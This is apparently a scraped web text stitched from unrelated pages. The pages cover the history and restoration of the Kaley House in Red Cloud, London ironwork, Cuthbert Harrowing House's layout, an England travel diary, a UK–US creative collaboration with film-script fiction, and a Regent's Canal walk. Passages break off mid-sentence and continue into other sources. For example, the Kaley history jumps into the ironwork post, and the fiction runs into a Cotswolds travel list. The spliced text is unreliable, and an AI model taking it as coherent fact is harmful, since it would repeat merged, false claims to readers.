Book Store and one should be hanging in the back stairway.)</p>   <p>Upon Cyrelia&#x2019;s death on April 15<sup>th</sup>, 1901, her remains were taken back to Indiana. At this time, Charles turned much of his business over to his younger brother, David H. (&#x201c;Dave&#x201d;) Kaley (born December 23<sup>rd</sup>, 1859 near Carey, Ohio).&#xa0; Dave moved from Ohio to Red Cloud when he was 19, and married his much younger wife, Dora Drain (Henderson) Kaley (born 1876), on January 6, 1896, when he was 37 and she was around 20.&#xa0; In 1901, Dave and Dora were residing near Cowles (ten miles northeast of Red Cloud) when they moved to Red Cloud to live with Charles after Cyrelia&#x2019;s death. Dora was a contemporary of Willa Cather and they were lifelong friends. Dora even delivered a speech that Cather had written for the 1910 Red Cloud High School graduation ceremony when Cather unexpectedly had to go to London as part of her duties as Managing Editor of<em> McClure&#x2019;s</em> magazine in New York.&#xa0; Dave and Dora served as hosts for social functions, caretakers of the home and companions to Charles when he wasn&#x2019;t traveling, which was rare&#xa0;after Cyrelia&#x2019;s death.&#xa0; Charles&#x2019;s obituaries noted that he had traveled twice around the world, including a tour of Palestine, and that he had attended every national convention of the Republican Party for the last quarter century. In 1904, one of Charles&#x2019;s younger brothers, Albert U. (Bert) and Bert&#x2019;s wife, Winter Welcome (Webb) Kaley, built the now-blue house across the street to the east. Over the years, four generations of Kaleys resided there.</p>   <p>Charles was en route to Los Angeles with his sister Bess to spend the winter when he became ill and then died there of pneumonia on January 8<sup>th</sup>, 1917. At the time of his death he was survived by four brothers &#x2013; Albert U. and David H. of Red Cloud, J.L. of Omaha, and J.A. of Elmyra, Ohio; as well as three sisters &#x2013; Mrs. W.R. Black of Boulder, and Mrs. Anna Cather and Elizabeth (&#x201c;Bess&#x201d;) Kaley of Lincoln. In total, Charles&#x2019; and Dave&#x2019;s parents had 12 children.&#xa0; Charles was eulogized by local attorney, Jas. S. Gilham, as follows: &#x201c;In the death of Col. C. W. Kaley, Webster County loses a citizen who probably enjoyed a larger measure of respect and popularity than any other man within its limits.&#x201d; His funeral was held in the home.</p>   <p>Upon Charles&#x2019; death, Dave and Dora inherited the house.&#xa0; They are the finely turned out couple in the March 1909 photo hanging over the fireplace. &#xa0;They lived in the house until Dave died on March 13<sup>th</sup>, 1951 at age 91, followed by Dora in 1958.&#xa0; At his death, Dave was also survived by his brother Albert/Bert who still lived across the street, and sister Bess, then of Los Angeles.&#xa0; As was the case with Charles and Cyrelia, Dave and Dora had no children.</p>   <p>The home was then sold to Francis and Josephine Bohrer in 1959 who were moving into Red Cloud from their farm. Francis died in 1961 but Josephine remained in the home until April 1995. The only children who ever lived in the house were the Bohrers&#x2019; youngest daughter, who was then already a senior in high school, and later a high school junior who stayed one winter to help out Josephine. As young children, Jay and his sister, Sally, used to stay overnight in the then rather    <div>   <p>The ironwork out in the South West corner of London is different to that seen in the centre. In I saw lots of railings and balconies. For Richmond, Ham and Kew the focus is on the main gate which is wide has a big surrond which gives a visitor a good view of the driveway and house.</p>   <p>Many of these have complex gate posts that rise much higher that the gates.</p>   <p>Unsurprisingly Kew Gardens has some particular find examples and these are some of the largest I&#x2019;ve seen.</p>   <p>In Richmond town the gates are smaller but no less detailed.</p>   <p>Down by the river there are some excellent modern designs on the bridges both big and small.</p>   <p>I also saw some delightful metalwork up by the American University but more on that in a later post.</p>   <div>    <h5>Related Posts:</h5>   </div>   <p><span><span>By </span></span> </p>     <p> &#xa0; Posted&#xa0;in:&#xa0; Tags:&#xa0;&#xa0; &#xa0; </p>  </div>  
spooky house when their parents were busy with the Saturday night customers at their meat market.&#xa0; Jay often told Josephine that someday he wanted to own the home, and just before Josephine moved into the nursing home, she had one of her daughters-in-law call to see if &#x201c;Jay-Jay still wanted the house.&#x201d; Much to Wade&#x2019;s dismay, Jay&#xa0;did.&#xa0; Jay and Wade purchased &#x201c;The Kaley House&#x201d; for $5,000 the next year &#x2013; somewhat prophetically on April Fool&#x2019;s Day.</p>   <p>As for the house&#x2019;s reconstruction, the chimneys were completely rebuilt in 1998, and although supports had been put in place, the carriage house in the northwest corner of the 0.6 acre lot collapsed under the weight of a heavy snowfall in 1999. The nine-foot basement was added in 2004-2005, the double-hung windows were replaced soon thereafter, and the porch was rebuilt in 2008-2009 after being torn off 12 years earlier. The Eastlake porch posts are original, but all of the trim was replicated from the Dave and Dora photo above the fireplace, as were the king-post trim and lattice work in the gables.&#xa0; The entire interior of the house has been gutted, renovated, re-plumbed and re-wired.</p>   <p><strong>UNIQUE FEATURES OF THE HOUSE INCLUDE:</strong></p>   <ul>    <li>The original etched-glass front doors, and the flaps underneath these doors that are activated to extend when the door is closed to cut drafts &#x2026;..pretty cool 1880&#x2019;s technology!&#xa0;</li>    <li>The original &#x201c;twist&#x201d; doorbell on the formal front door</li>    <li>The red glass window in the formal front door&#x2019;s transom (the use of red glass was a sign of&#xa0;wealth since red glass is made with gold)</li>    <li>The lower part of the wall going up the front stairway has been stenciled to replicate the original wall paper. Dividing the upper and lower sections of the wall is the original gold trim.</li>    <li>The original interior doors, pocket doors, trim and woodwork, wooden floors, the bay windows&#x2019; shutters, door hardware, and chandeliers and their glass shades</li>    <li>The&#xa0;fireplace (now gas) which, according to family members, Charles imported from Italy</li>    <li>The china cabinet (which seemed to have originally been a double-sided pass-through to the butler&#x2019;s pantry) was turned around to face into the Fireplace Parlor.</li>    <li>&#xa0;The &#x201c;hidden&#x201d; circus posters</li>    <li>The gold-colored picture rail trim in the North Parlor is the original trim that hung near the ceiling in all three parlors.&#xa0; It was so fragile that much of it fell apart when&#xa0;removing it, so we need to find a suitable substitute for the other two parlors.</li>    <li>The iron fence of the ornamental &#x201c;widow&#x2019;s walk&#x201d; above the south bay window and outside of the Master Bedroom&#x2019;s windows</li>    <li>The narrow and rather steep back stairway.&#xa0; (The new woodwork design where the railing attaches to the wall is the inverse of an exterior design detail beneath the facia boards.)</li>    <li>The window-pane door in the north upstairs bedroom (&#x201c;Dora&#x2019;s Room&#x201d;) was thought to be a way to &#x201c;keep an eye on&#x201d; the hired girl who slept in the small room in the west end of the second floor (now part of the master bathroom), as&#xa0;she came and went via the back stairway.</li>   </ul>   <p><strong>FUTURE PROJECTS&#xa0;INCLUDE:</strong></p>   <ul>    <li>Restoring the interior of the summer kitchen building, which Dave later used as his office</li>    <li>Restoring/replacing the outside window shutters</li>    <li>Recreating the cresting atop the roof lines and installing replicas of the roof finials</li>    <li>Commissioning an era-appropriate landscape plan and implementing it over time</li>    <li>Installing a fence along the interior edges of the&#xa0;sidewalks</li>    <li>And (if we start making a lot more money) possibly rebuilding the carriage house</li>   </ul>  </div>  
   <div>   <h3>Location</h3>   <p>Cuthbert Harrowing House looks over Fann Street at the front. At the back it looks over a paved courtyard towards Great Arthur House.</p>   <h3>Maisonettes</h3>   <p>18 two-storey maisonettes, 14 two-bedroom, 4 three-bedroom near the western end.</p>   <p>Lower level</p>   <ul>    <li>Main entrance from a rear corridor.</li>    <li>Kitchen, dining area, and living room.</li>    <li>Glazed screen between the kitchen and the dining area. Hardwood veneer floors.</li>    <li>Staircase from the living room to the upper floor. (In the upper maisonettes, the stairs rise from opposite the front door.)</li>    <li>The double height stairwell and the open tread of the staircases were designed to increase the impression of space.</li>   </ul>   <p>Upper level</p>   <ul>    <li>Two bedrooms and a bathroom. (In the two western bays, on either side of the secondary access, the flats have an additional third bedroom in the space left by the stairwell.)</li>    <li>Bathroom is in the centre and has &#x201c;clerestory glazing&#x201d; (windows above eye level).</li>    <li>Balconies at the front (see below).</li>   </ul>   <h3>The overall layout</h3>   <ul>    <li>4 storeys, with basement stores underneath.</li>    <li>&#x201c;Mono pitch&#x201d; (flat) roof.</li>    <li>Two rows of two-storey maisonettes. (The way architects put it is that the building &#x201c;presents&#x201d; as two terraces of two-storey houses, one on top the other.)</li>    <li>Maisonettes runs through the building from front to back..</li>   </ul>   <h3>Crosswalls and bays</h3>   <ul>    <li>A series of crosswalls divides the building into bays.</li>    <li>Each bay contains two-storey maisonettes on top of each other.</li>    <li>The crosswalls were built from pink bricks with pink mortar.</li>    <li>The crosswalls form the main structural support for the building, allowing the maisonettes in between them to have a mainly glass frontage.</li>   </ul>   <h3>Rear of the building</h3>   <ul>    <li>The rear of the building faces a courtyard below street level.</li>    <li>The courtyard is reached via three ramp downs from the western side of the building, and also stairs from street level.</li>    <li>The cross walls are replaced by wide brick piers.</li>    <li>There are stores behind the piers at courtyard level.</li>    <li>At &#x2018;ground&#x2019;/street level and second floor levels, corridors run along the back of the building behind the piers, giving access between the maisonettes and the main stairs of the stair case and entrance block.</li>    <li>The entrances to the maisonettes are timber doors set in pairs.</li>    <li>The &#x2018;ground&#x2019;/street level floor corridor is protected from burglars by metal bars from floor to ceiling, with a glazed window in front of each maisonette&#x2019;s rear window, presumably to reduce the impression of being behind bars.</li>    <li>On the upper floors of the maisonettes, windows extend to the front of the piers.</li>    <li>At the western end of the building there in an extra set of escape stairs which take up the back half of the penultimate bay and reach courtyard level.</li>   </ul>   <h3>Windows and panels</h3>   <ul>    <li>The crosswalls extend to the building line at the front, but most windows are set back a couple of feet behind that.</li>    <li>The penultimate bay on the western end contains third bedrooms for flats on either side. The windows of these extra bedrooms are flush with the very front of the building.</li>    <li>Windows are all set in aluminium surrounds.</li>    <li>Bright blue cladding panels are set in bands below the windows, which are also in the aluminium framework. Generally there are four panels for each set of two windows.</li>    <li>Continuous bands of glazing and blue panels appear on the top floor of the upper maisonettes.</li>   </ul>   <h3>Balconies for upper maisonettes</h3>   <ul>    <li>The upper maisonettes have concrete balconies at the front.</li>    <li>Each balcony run between the crosswalls with steel railings along the top.</li>    <li>Each balcony has gaps for a first few inches from floor level, presumably to allow water to drain away.</li>   </ul>   <h3>Access galleries for lower maisonettes</h3>   <ul>    <li>Each lower maisonette has an access gallery (a semi-balcony) outside the lower front windows.</li>    <li>Concrete steps lead up from the front courtyard, and then steps paved in quarry tiles lead up to the access gallery.</li>    <li>The access gallery has a low concrete wall with metal railings set in it.</li>   </ul>   <h3>Staircase and entrance</h3>   <ul>    <li>At the eastern end of the building is a staircase and entrance block, which contains the stairs to the other levels. It is mainly a metal frame with glazed panels.</li>    <li>Each flight of stairs and its landing was constructed as a single pre-cast piece of concrete, with metal railings set into it.</li>    <li>The staircase then opens onto the corridors running along the back of the building at the entrance door level of each set of maisonettes.</li>    <li>There is a rubbish chute like a huge pipe running beside the staircase and entrance block.</li>   </ul>   <h3>Secondary access</h3>   <ul>    <li>The penultimate bay at the western end contains a secondary escape coming out of the rear of the building.</li>    <li>The staircase only takes up the back half of that bay. This leaves spare space for third bedrooms for the maisonettes on either side.</li>   </ul>   <h3>Front garden or courtyard</h3>   <ul>    <li>The garden (more like a courtyard) is about four feet down from street level and protected by black-painted metal railings.</li>    <li>The garden is essentially a paved space of about 15 feet between the building and the pavement.</li>    <li>There are steps down to the garden from the entrance structure at the eastern end.</li>    <li>There are bushes and trees growing in areas at regular intervals next to the pavement. Some people put out pots with their own plants.</li>   </ul>   <h3>Name</h3>   <p>Thomas Cuthbert Harrowing was the former chairman of the Public Health Committee, prior to 1951 when the estate was built.</p>   <h2>Cuthbert Harrowing House flat plans</h2>   <p><span><strong>Please note</strong>.

   <div>   <p>After two-and-a-half weeks, we&#x2019;re back from England. Our trip was amazing. My head is still filled with thoughts of England, and we took almost 5,000 photos, so you&#x2019;ll be hearing from me about England for a good while to come. Here&#x2019;s a quick review of the places we visited and the things we did each day, along with some tips for a better experience if you are visiting.</p>   <h3>Day 1</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: An impressive church in the heart of the city. If you are in Bath, it&#x2019;s definitely worth going in and having a look, especially since it&#x2019;s free. Be sure to take a close look at the beautiful stained-glass windows.</li>    <li>Walking around in Bath: The city is very walkable and has a plethora of interesting, historic buildings. The giant lawn in front of the Royal Crescent is great for picnics, rest, people watching, and, for at least one couple while we were there, making out. The shopping is all down by Stall Street and the train and coach stations, and that area tends to get very crowded on the weekends with tourists and day-trippers all converging on it, but walk a few blocks away and you get into some much more peaceful residential neighborhoods that still boast interesting features. Don&#x2019;t try driving into the city. Parking is a pain.</li>   </ul>   <h3>Day 2</h3>   <p><strong>South Wales</strong></p>   <ul>    <li>: One of the most underrated attractions in Britain, perhaps because it&#x2019;s a little bit out of the way of the typical tourist route that revolves around <b>London</b>. As you approach it by car, you turn around a sharp bend and there it is, seemingly popping out of the ground. When you step on the grounds, there&#x2019;s an eerie silence except for the wind caroming through this skeletal remain of a once-glorious church and the occasional sound of pigeons and doves flapping their wings. It all combines to make the place hauntingly beautiful. It&#x2019;s not hard to see why this place moved Wordsworth to verse.</li>    <li>: The capital of Wales has some urban sprawl, but it&#x2019;s still a neat town. Cardiff Castle sits right in the middle of town, and next to it, the Central Market and the surrounding shops and arcades are worth checking out. Also, the whole city seems crazed about its rugby team.</li>   </ul>   <h3>Day 3</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: This annual September event is a must-do for all Austen fans who are visiting Bath. And if you&#x2019;re not an Austen fan, it&#x2019;s fun to just show up for the Grand Promenade (always on the first Saturday of the week-long festival) that marks the beginning of the festival to snap pictures and gawk at hundreds of nerds dressed in Regency attire. The promenade starts in front of Bath Abbey and ends at Queen&#x2019;s Place Square.</li>    <li>: This was mildly interesting and probably would be more so if you were interested in fashion. Otherwise, it&#x2019;s an easy attraction to skip.</li>    <li>: The center&#x2019;s exhibits have received mediocre reviews on TripAdvisor.com, but even the critics on there agree: The tea room on the third floor of the center serves great afternoon tea. What&#x2019;s more, you get to sip that tea under the genteel gaze of a big painting of Colin Firth as Mr. Darcy. That face, by the way, is plastered everywhere in the center, from the welcome sign at the entrance to the cans of shortbread in the gift shop.</li>   </ul>   <h3>Day 4</h3>   <p><strong>Southwest England</strong></p>   <ul>    <li>: A definite must-do for any visitor to England. However, instead of just looking at the stones from behind the ropes from a few hundred feet away, shell out a bit more cash and get the , which lets you actually walk between the rocks (though you&#x2019;re not allowed to touch them). They offer this special access at certain times of the year and for one to two one-hour sessions each day either before or after regular visiting hours. Suck it up and go for the 6:45 a.m. session. Once you watch the sun rise over Stonehenge from amidst the stones, you&#x2019;ll never see them quite the same way again.</li>    <li>: If ancient stone monuments are your thing, then this is worth a look since you are actually allowed to touch the stones. In fact, they are just strewn across a giant tract of pasture land in the middle of the nowhere. There are chalk walking trails (the area used to be an ancient seabed) going right to and past the stones, as well as flocks &#xa0;of sheep that graze in their shadows. It&#x2019;s about a 45-minute drive from Stonehenge and the route is very scenic, though a bit narrow at times. We also got a surprise view of the white horse hillside carving along the way. The village of Avebury, which sits right next to the stone circle, is pretty cute and worth a quick walkthrough, though the gift shop and the National Trust facilities in the village are a bit touristy.</li>    <li>: An extremely adorable village that has served as a filming location for numerous movies and TV shows set in adorable British villages. It&#x2019;s also very touristy as every other shop sells photos of movie stars on location. The Red Lion serves some pretty good food. On the drive to Lacock, keep an eye out for scenic views of the valleys and hills.</li>    <li>: Another old abbey that has also appeared in movies. The bottom floors are more interesting as they consist of construction from various older periods of the abbey&#x2019;s 800-year history. The upper floors, which were renovated in the 1800s and which now serve as the Fox Talbot Museum, are a bit more a jumble of styles and artifacts.</li>    <li>: It was a hectic drive to get there, but the payoff was well worth it as this was one of the surprise hits on our itinerary. Once you get up there, you realize that the remnants of the 15th-century St. Michael&#x2019;s Church at the top of the tor are just decoration, as the best view is down, not up. The view from 557 feet is spectacular, and we were told that on a clear day you can see to the other side of the English Channel on one side and to Wales on another. You can either walk all the way up to the top of the tor, which could take about an hour or so, or take a bus from the Glastonbury Abbey courtyard that will drop you off at a spot about a 15-minute hike from the top. Just to add to your England experience, we recommend taking the bus and then watching the driver negotiate the one-car-wide but two-way road up and down the tor. Watch out for sheep poo on the hike up the tor.</li>   </ul>   <h3>Day 5</h3>   <p><strong>Bath</strong></p>   <ul>    <li>: This was a good exhibit that strikes a nice balance between being interesting and educational. There are a lot of models and exhibits explaining the history of the baths in the museum portion, and the bathing pool in the center is a good photo spot, especially from the upper <b>railings</b>, where you can get a nice view of Bath Abbey in the background. The free audio tour is excellent, even the kids&#x2019; tour. Your ticket to the baths also entitles you to one glass of the hot spring water that has drawn people to Bath for centuries. The water tastes warm and mineraly, which we didn&#x2019;t mind too much as we finished our glasses. However, if this was in China, you might very well be calling it contaminated and undrinkable. In Bath, though, it&#x2019;s a tourist attraction. The whole place takes about two hours to see thoroughly, especially if you listen to most of the audio tour.</li>   </ul>   <p><strong>Cotswolds</strong></p>   <p>This stretch of English countryside is indescribably beautiful. Don&#x2019;t worry so much about getting to your final destination. Just drive, look out for scenic spots, stop, and explore on foot. If you plan on driving, get the excellent directions for the , a particularly scenic route through the area (). Among the places we stopped at:</p>   <ul>    <li>: Blink and you&#x2019;ll miss their sign on the side of the road. Two potters share this space and they make some very nice pieces.</li>    <li>: This is one of the most well-known Cotswolds towns.

Although originally from the UK, Charles is currently based in Baltimore and Bobby lives on the Welsh borders. It seemed natural, then, that the project should embrace this geographical disconnect and come up with an idea that spans two continents.</b></p>    <p>&#xa0;</p>    <p><b>Our </b><b>Starting Point</b></p>    <p>We agreed to exchange six to ten photographs of a place we thought was interesting; somewhere that, to mangle Emily Dickinson&#x2019;s phrase, dwelt in possibility.&#xa0; Other than the pictures, we agreed to disclose only the barest facts to each other about our chosen location.&#xa0; We would then each produce a creative response to the pictures: it could be prose, poetry, music &#x2013; anything. But we could only work from the pictures, not with any further research on the location.</p>    <blockquote>     <p><span><i>Bobby Seal: The place I chose for Charlie is Rock Park, a rundown Victorian suburb in Rock Ferry, near Birkenhead.&#xa0; I chose Rock Park because I&#x2019;ve often passed by, but never explored it.&#xa0; Its main fascination for me was that it was the birthplace of May Sinclair, a writer for whom I have a great admiration.</i></span></p>     <p><span><i>Rock Park was built on the banks of the Mersey between 1837 and 1850. The large, substantial houses were constructed with local sandstone and housed wealthy merchants and brokers who traded across the river in Liverpool.&#xa0; Until 1939 there was a ferry to Liverpool.</i></span></p>     <p><span><i>Rock Park has declined in recent decades: the wealthy have moved away and many of the houses have been divided into </i><i>flats. &#xa0;In the 1960s a new by-pass cut a swathe through&#xa0; Rock Park and many &#xa0;of the houses were demolished. I didn&#x2019;t find May Sinclair&#x2019;s house, but I did find the house once &#xa0;lived in by </i><i>Nathaniel Hawthorne, the American writer.&#xa0; He was US Consul </i><i>in Liverpool for a time and lived at Hawthorne House, 26 Rock Park. &#xa0;Unfortunately, all that is left is one gate-post.</i></span></p>    </blockquote>   </div>   <p>&#xa0;</p>   <blockquote>    <p><span>Charles Swain: When we came up with the initial concept for the project I had a number of places that I had previously visited that I could have chosen to present to Bob. The setting had to be in the USA, so that ruled out a lot of locations from back home in the UK. I was originally going to write a piece on Fort Wetherill myself for Travin Systems but it struck me as having the potential to work really well in this project.</span></p>   </blockquote>   <div>    <p>&#xa0;</p>    <p>&#xa0;</p>    <p><b>Why This Collaboration, or What the Fuck Were You Thinking Of?</b></p>    <p>&#xa0;</p>    <blockquote>     <p><span>We&#x2019;d both agreed a while ago that it would be a good idea to work on some kind of collaboration, but the basic idea for this particular project came from Charlie. Although we&#x2019;re working in different fields, there &#xa0;seems to be some commonality in the themes we each explore: place, history, memory, the stories wrapped up within a landscape.</span></p>    </blockquote>    <p>&#xa0;</p>    <blockquote>     <p><span>The project came about through thinking of alternate ways to present places. Places that are a wellspring of emotion and curiosity via the depth of their history, their physical appearance and the singular atmosphere that is present when visiting them at a certain moment in time. This multiplication of variation sifts through your emotional state at the time to create an impression and that is what I try to put down via words, photography or music. We are both extremely interested in these ideas and to allow each other to interoperate each&#x2019;s visits seemed natural. It was also thoroughly enjoyable.</span></p>    </blockquote>    <blockquote>     <p>&#xa0;</p>     <p><span>Practically speaking it made sense to accept that I am based in the UK and Charlie in the US, so any collaboration would of necessity be predicated on an electronic dialogue.&#xa0; But actually, that&#x2019;s what gives the project its cutting edge; we chose delib- erately to restrict ourselves to writing about a landscape we&#xa0;</span><span>had never visited using as inspiration just the handful of photo- graphs provided by the other person.&#xa0; In other words, we would each try to create a new reality from, to use Eliot&#x2019;s words, nothing more than &#x2018;a heap of broken images&#x2019;.</span></p>    </blockquote>   </div>   <p>&#xa0;</p>   <blockquote>    <p><span>By presenting someone just photos and a brief outline of the location, which is what we did in this piece, you effectively ab- stract them in two ways. From the physical location itself and your own or others&#x2019; impressions of that place. Then you ask them to mentally transcend the 3000 miles or so to write about it.</span></p>   </blockquote>   <p>&#xa0;</p>   <blockquote>    <p><span>In restricting what one&#x2019;s collaborator sees to a handful of pictures, one&#x2019;s imagination is freed&#xa0; to go beyond the confines of the lens. The human brain has a unique talent for constructing images and patterns, even where none exist in an objective sense. This is the story of a half-blind stumbling towards discovering some kind of meaning from a set of photographs.</span></p>   </blockquote>   <p>&#xa0;</p>   <p><b>T</b><b>his is What We Thought</b></p>   <p>&#xa0;</p>   <blockquote>    <p><span>I&#x2019;ve never explored the east coast of the USA, though I have a vague idea of the location of Rhode Island.&#xa0; From the sparse factual details provided, I was aware that Fort Wetherill had been a military strongpoint since colonial times and was last used during the Second World War.&#xa0; Having been abandoned for many years, it was adopted as a State Park in 1972.&#xa0; We&#xa0;had already agreed that we would do no further research on the location in the pictures provided by the other.&#xa0; Sorry Wikipedia!</span></p>   </blockquote>   <blockquote>    <p><span>The first thing that struck when I saw the Rock Park pictures was the houses.

From behind &#xa0;this the shape of a man &#xa0;appears-his outline becoming more defined &#xa0;as he steps out from the cool recesses of the living curtain. He wears mourning dress, a stiff collar and a bright gold watch chain. At first we see hem &#xa0;only in silhouette but as he steps into the light his features become clear, vivid intelligent eyes, an aquiline nose and full, slightly parted lips. His hair is longish and parted to one side.</p>    <p>We follow him as he starts along a curving, unmarked road of grey tarmac. Along one side are low privet hedges broken occasionally by tall Iron gates. Some of these gates have swung heavily to one side, their hinges rusty and stiff. The man enters through a particularly ornate set but hesitates on the threshold of the property as if their openness belies a malevolent intent. Shrugging he moves up the spacious drive. He kicks bits of masonry into the prolific tangle &#xa0;of undergrowth that has &#xa0;replaced the front lawn.</p>    <p>Going up to the door of the large house he pulls a large key from him pocket and tries it&#xa0;in the lock.

In the mid-ground there &#xa0;is a strip of grey water punctuated here and there by small boats and the occasional neon buoy. In the background a cityscape stretches, uniform in its dirty, dull shades of black, brown and grey. There are low sheds, church spires and the outlines of various masts and cranes. Above this the sky fills out the view as you would fill a &#xa0;jar containing some soft metal&#xa0; with oil. Right in the center of the frame, in the middle of the muddy beach stands the man, the wind whipping at the tails of his coat and around his trouser cuffs.</p>    <p><b>[Close </b><b>up of the man&#x2019;s face]</b></p>    <p>His skin looks pallid and slightly greasy.

At some points there are sections of wrought iron railings, slightly less grand than their counterparts at the front. There are stone pillars and the dappled grey- white of modern lampposts. Some of the entrances are boarded up with chipboard and cheap planks. A thick cable of ivy runs down the center of one of these shuttled portals, its leaves are of a dark racing green and they give of a rich, bitter scent. The man is centered with his back to the camera, his arms &#xa0;stretched above his head and his hands flat against the wooden boards.</p>   <p><b>[From </b><b>the POV of the man looking down]</b></p>   <p>He notices a chink in the makeshift timber armor of the door in front of him. Through it can be seen a heart &#xa0;shaped gate &#xa0;handle of black iron. He pulls and twists it. The town center is pretty and has a number of shops and restaurants. The pay-and-display parking lot at the edge of the town also boasts of a public restroom that apparently is the Cotswolds Loo of the Year.</li>    <li>Willsersey: The small farming village where we stayed in the Cotswolds. Try The Bell Inn for an excellent dinner, and check out the church and community bulletins in the pub while you wait for your food. The items on there give a glimpse into life in these small villages and towns.</li>   </ul>   <h3>Day 6</h3>   <p><strong>Cotswolds</strong></p>   <ul>    <li>Biking around Cotswolds: Definitely one of the highlights of our trip and highly recommended if you are at all physically up to it. There are a number of places around the Cotswolds where you can rent bikes, and we got ours from in Chipping Campden. Just pick an easy route and enjoy the scenery. The roads are pretty safe with little traffic, and drivers here do a pretty good job of respecting cyclists. There are some steep hills, but you can just push your bike up those. We did a 15-mile loop that was called &#x201c;undulating&#x201d;, which featured two or three of these steeps hills and took us about four hours to complete, with a lot of stopping and photographing thrown in. The trail took us through Ebrington, Paxford, Aston Magna, Draycott, and Broaden Campden, all with its own unique charms.</li>    <li>Chipping Campden: A large market town with a happening High Street (the town center in many of these small English towns). The town has several churches, the biggest and most interesting of which is St. Jame&#x2019;s, which also has an interesting cemetery around it with some very old tombstones.</li>   </ul>   <h3>Day 7</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: All three of these houses are way too touristy and it often feels like they are trying to draw some strained connection to Shakespeare in order to turn them into tourist attractions. The building at Nash&#x2019;s House, for instance, isn&#x2019;t even the original house that actually had some remote ties to Shakespeare, but rather was just the building that happens to be on the site of the original structure. You can see the building in which Shakespeare was born from the touristy pedestrian-only Henley Street that runs directly behind the building, so you can just pose there for a picture and save yourself money and time by skipping the cheesy, conjecture-filled exhibition inside. Actually, all of the Shakespeare houses are easily skippable without great loss if you are pressed for time.</li>    <li> on the River Avon: There are several boating places in Bath. Punting really requires good balance, and it takes awhile to pick it up. If you are just looking for a nice, relaxing float down the river, rent a row boat instead.</li>   </ul>   <h3>Day 8</h3>   <ul>    <li>: This movie stand-in for Pemberley from <em>Pride and Prejudice</em> is a jewel of a mansion set amid a wealth of natural beauty. The interior of the mansion looks awesome, but the grounds really steal the show, whether it&#x2019;s the rock garden or the maze or the dahlia garden in full bloom or just the rolling hills that surround the place.</li>   </ul>   <h3>Day 9</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: This was the most interesting of the Shakespeare houses as it had a cute garden and more character than the others. One of the guides gave a very nice talk about the kitchen area, pointing out different pieces of equipment and explaining how they gave rise to certain phrases that we commonly use today. It also feels less touristy than the other houses.</li>    <li>: &#x201c;Britain&#x2019;s Ultimate Castle&#x201d;, as the attraction bills itself, is torn between making itself a fun place or an educational place, and it does neither well. The castle itself is pretty nice to walk around in, but the exhibitions, such as a wax-mannequin exhibit about the sex scandal the former Lady of Warwick was involved in, and entertainment are too cheesy but not all that &#x201c;fun&#x201d;. I would say it&#x2019;s not worth the price and can be skipped. If you want to see old castles, England has plenty that are less cheesy.</li>   </ul>   <h3>Day 10</h3>   <p><strong>Stratford-upon-Avon</strong></p>   <ul>    <li>: Who knew you could get pulled pork on the streets of Stratford-upon-Avon? And game-meat pie, too! Too bad it&#x2019;s only once a year.</li>    <li>Walking around Stratford: The area around the River Avon is very touristy and crowded, but follow the river for a few minutes and you start getting into nice and quiet neighborhoods along the banks of the river. Watch barges sail up and down the river through a series of locks. On Saturdays, the square where the statues of Shakespeare and characters from his plays stand has a number of interesting street stalls selling antiques and miscellaneous knickknacks.</li>   </ul>   <h3>Day 11</h3>   <p><strong><b>London</b></strong></p>   <ul>    <li>: In all honesty, the actual ceremony is not all that interesting, but I guess this is one of those do-it-so-you-can-say-you-did-it things when visiting <b>London</b>.&#xa0;If you are not right up front against the fence, you&#x2019;re not going to get a great view, and if you are anywhere behind the first couple rows of spectators, you can pretty much forget about seeing anything unless you are 7 feet tall. So get there at least an hour early if you want to be in the front (we got there 30 minutes early and already the first row was filled up). Another option is to position yourself along the road leading to the <b>gates</b> so you can see the guards enter and leave the palace grounds.</li>    <li>: It&#x2019;s big and it&#x2019;s a must-see for art lovers. Photography is not allowed anywhere in the building. Don&#x2019;t eat in the cafe, which serves very mediocre food.</li>    <li>: This looks like a nice space, but it&#x2019;s also very crowded. In addition, when we went, there was a concert being held at the square, and the stage blocked a good chunk of the space, so we really couldn&#x2019;t see the square without obstructions.</li>    <li>: I was underwhelmed by this spot, which is just a big, busy intersection. The island in the middle of the intersection is filled with people taking pictures, but really, this attraction is rather shrug-inducing.</li>    <li>: I guess this is a fine area if you are into shopping at generic department stores while traveling abroad. And a lot of people must like to do that, since this area is very crowded. However, any foreign destination with five Starbucks locations in a 2-mile radius holds little charm for me. Just imagine your upscale local mall with more people. In fact, skip this area and just hit up your local mall.</li>    <li>: It&#x2019;s pretty much like the Chinatowns I&#x2019;ve been to in the United States, except a bit cleaner and neater. Just about every restaurant has a window displaying their roast ducks. It borders the theater district, so this could be a decent place for a pre-show meal if you&#x2019;re going to watch one of the numerous musicals on stage in <b>London</b> at any one given time.</li>   </ul>   <h3>Day12</h3>   <p><strong>Dorking</strong></p>   <ul>    <li>: The hill is somewhat steep but definitely walkable, and the climb is worth it as the top offers a great view. If you are going by train, get off at the Box Hill and Westhumble station and it&#x2019;s just a 15-minute walk from there to the foot of the hill.</li>    <li>: This was an unexpectedly charming little town with a nice High Street that has some unique shops as well as chain fronts. One of the side streets is filled with antique shops, though most of them are rather high-end. The Surrey Yeoman pub on High Street serves good meals.</li>   </ul>   <h3>Day 13</h3>   <p><strong><b>London</b></strong></p>   <ul>    <li>: One of the more interesting attractions in <b>London</b>, and it&#x2019;s presented pretty tastefully, unlike other grand structures such as Warwick Castle. This place is big, so plan on spending more than half a day here if you want to see everything. The Beefea   <div>   <h1>Regent&#x2019;s Canal : Limehouse to Islington</h1>   <div>    <p>This walk was actually completed in 2011, when it was one of a series of walks in an AA guide book. The walk actually starts&#xa0;slightly&#xa0;away from the Canal in Limehouse, but here I have extracted just the canal part of the route. I did not have my GPS unit switched on for the walk, so the plot in GoogleMaps was a pre-prepared route rather than the actual recording.</p>    <p>The can starts off as it enters the Limehouse basin, as can be seen in another canal walk (starting at Bow and going in a loop around Regent&#x2019;s Canal and the Hertford Union Canal). Anyway, we join the canal by Salmon Lane lock, on a moderately bright Sunday afternoon.</p>    <div>     <p>Salmon Lane Lock</p>    </div>    <p>The canal heads generally to the north east until it reaches this rail bridge, where it swings through about 60 degrees to the north west.</p>    <div>     <p>Rail Bridge (60)</p>    </div>    <p>To the eastern side of the canal are several green open spaces and the feeling is one of light and quiet.</p>    <div>     <p>Victory Bridge (59)</p>    </div>    <p>Locks on this&#xa0;section&#xa0;are relatively evenly spaced.</p>    <div>     